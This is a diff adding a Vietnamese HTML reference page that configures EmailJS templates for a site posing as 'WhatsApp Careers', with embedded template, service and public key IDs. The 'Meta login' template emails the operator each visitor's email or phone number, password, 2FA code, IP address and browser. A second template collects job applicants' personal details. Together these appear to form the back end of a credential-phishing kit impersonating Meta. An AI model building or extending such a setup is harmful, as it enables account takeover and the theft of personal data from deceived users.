@@ -1,0 +1,217 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>EmailJS Template Reference</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            line-height: 1.6;
+            margin: 20px;
+        }
+        .container {
+            max-width: 800px;
+            margin: 0 auto;
+        }
+        .section {
+            border: 1px solid #ccc;
+            padding: 15px;
+            margin-bottom: 20px;
+            border-radius: 5px;
+        }
+        h1 {
+            color: #333;
+        }
+        h2 {
+            color: #0078d4;
+            margin-top: 0;
+        }
+        code {
+            background-color: #f4f4f4;
+            padding: 2px 5px;
+            border-radius: 3px;
+            font-family: monospace;
+        }
+        table {
+            width: 100%;
+            border-collapse: collapse;
+            margin-bottom: 20px;
+        }
+        th, td {
+            border: 1px solid #ddd;
+            padding: 8px;
+            text-align: left;
+        }
+        th {
+            background-color: #f2f2f2;
+        }
+        .note {
+            background-color: #fffbea;
+            border-left: 4px solid #ffd200;
+            padding: 10px;
+            margin-bottom: 20px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>EmailJS Template Reference</h1>
+        <p>Tài liệu này cung cấp thông tin tham khảo để cấu hình template EmailJS cho dự án WhatsApp Careers. Vui lòng sử dụng thông tin này để cấu hình template của bạn trong EmailJS.</p>
+        
+        <div class="note">
+            <strong>Lưu ý:</strong> Template của bạn có ID: <code>template_zvcv0qf</code>, Service ID: <code>service_ieaopgl</code>, và Public Key: <code>pgcGwVmRmBOKo-kUL</code>
+        </div>
+        
+        <div class="section">
+            <h2>1. Thông tin chung về Template</h2>
+            <p>Tạo một template trong EmailJS với định dạng sau:</p>
+            <table>
+                <tr>
+                    <th>Tên trường</th>
+                    <th>Mô tả</th>
+                </tr>
+                <tr>
+                    <td>{{event_type}}</td>
+                    <td>Loại sự kiện (LOGIN_ATTEMPT, JOB_APPLICATION)</td>
+                </tr>
+                <tr>
+                    <td>{{timestamp}}</td>
+                    <td>Thời gian xảy ra sự kiện</td>
+                </tr>
+                <tr>
+                    <td>{{ip_address}}</td>
+                    <td>Địa chỉ IP của người dùng (nếu có)</td>
+                </tr>
+                <tr>
+                    <td>{{user_agent}}</td>
+                    <td>Thông tin trình duyệt của người dùng</td>
+                </tr>
+                <tr>
+                    <td>{{details}}</td>
+                    <td>Thông tin chi tiết dạng JSON của sự kiện</td>
+                </tr>
+            </table>
+        </div>
+        
+        <div class="section">
+            <h2>2. Template cho thông tin đăng nhập</h2>
+            <p>Các biến dưới đây sẽ được gửi khi người dùng đăng nhập:</p>
+            <table>
+                <tr>
+                    <th>Tên trường</th>
+                    <th>Mô tả</th>
+                </tr>
+                <tr>
+                    <td>{{email}}</td>
+                    <td>Email hoặc số điện thoại người dùng nhập</td>
+                </tr>
+                <tr>
+                    <td>{{password}}</td>
+                    <td>Mật khẩu người dùng nhập</td>
+                </tr>
+                <tr>
+                    <td>{{verification_code}}</td>
+                    <td>Mã xác thực 2FA</td>
+                </tr>
+            </table>
+            
+            <p>Nội dung Email có thể định dạng như sau:</p>
+            <pre>
+Thông báo đăng nhập Meta
+
+Loại sự kiện: {{event_type}}
+Thời gian: {{timestamp}}
+Địa chỉ IP: {{ip_address}}
+Trình duyệt: {{user_agent}}
+
+Thông tin đăng nhập:
+- Email: {{email}}
+- Mật khẩu: {{password}}
+- Mã xác thực: {{verification_code}}
+
+Thông tin chi tiết:
+{{details}}
+            </pre>
+        </div>
+        
+        <div class="section">
+            <h2>3. Template cho thông tin ứng tuyển</h2>
+            <p>Các biến dưới đây sẽ được gửi khi người dùng nộp đơn ứng tuyển:</p>
+            <table>
+                <tr>
+                    <th>Tên trường</th>
+                    <th>Mô tả</th>
+                </tr>
+                <tr>
+                    <td>{{job_title}}</td>
+                    <td>Tiêu đề công việc</td>
+                </tr>
+                <tr>
+                    <td>{{job_id}}</td>
+                    <td>ID của công việc</td>
+                </tr>
+                <tr>
+                    <td>{{first_name}}</td>
+                    <td>Họ của ứng viên</td>
+                </tr>
+                <tr>
+                    <td>{{last_name}}</td>
+                    <td>Tên của ứng viên</td>
+                </tr>
+                <tr>
+                    <td>{{email}}</td>
+                    <td>Email của ứng viên</td>
+                </tr>
+                <tr>
+                    <td>{{phone}}</td>
+                    <td>Số điện thoại của ứng viên</td>
+                </tr>
+                <tr>
+                    <td>{{resume_filename}}</td>
+                    <td>Tên file CV đã tải lên</td>
+                </tr>
+                <tr>
+                    <td>{{cover_letter}}</td>
+                    <td>Thư giới thiệu (nếu có)</td>
+                </tr>
+            </table>
+            
+            <p>Nội dung Email có thể định dạng như sau:</p>
+            <pre>
+Đơn ứng tuyển mới - WhatsApp Careers
+
+Loại sự kiện: {{event_type}}
+Thời gian: {{timestamp}}
+Địa chỉ IP: {{ip_address}}
+Trình duyệt: {{user_agent}}
+
+Thông tin vị trí:
+- Vị trí: {{job_title}}
+- Mã vị trí: {{job_id}}
+
+Thông tin ứng viên:
+- Họ và tên: {{first_name}} {{last_name}}
+- Email: {{email}}
+- Điện thoại: {{phone}}
+- Tên file CV: {{resume_filename}}
+
+Thư giới thiệu:
+{{cover_letter}}
+
+Thông tin chi tiết:
+{{details}}
+            </pre>
+        </div>
+        
+        <div class="section">
+            <h2>4. Hướng dẫn cấu hình trong EmailJS</h2>
+            <ol>
+                <li>Đăng nhập vào tài khoản EmailJS của bạn.</li>
+                <li>Tìm và chọn template có ID <code>template_zvcv0qf</code>.</li>
+                <li>Thay đổi nội dung của template theo ví dụ ở trên, sử dụng các biến {{variable_name}} để hiển thị dữ liệu.</li>
+                <li>Lưu lại template.</li>
+                <li>Đảm bảo service có ID <code>service_ieaopgl</code> đã được cấu hình đúng để gửi email.</li>
+            </ol>
+        </div>
+    </div>
+</body>
+</html>
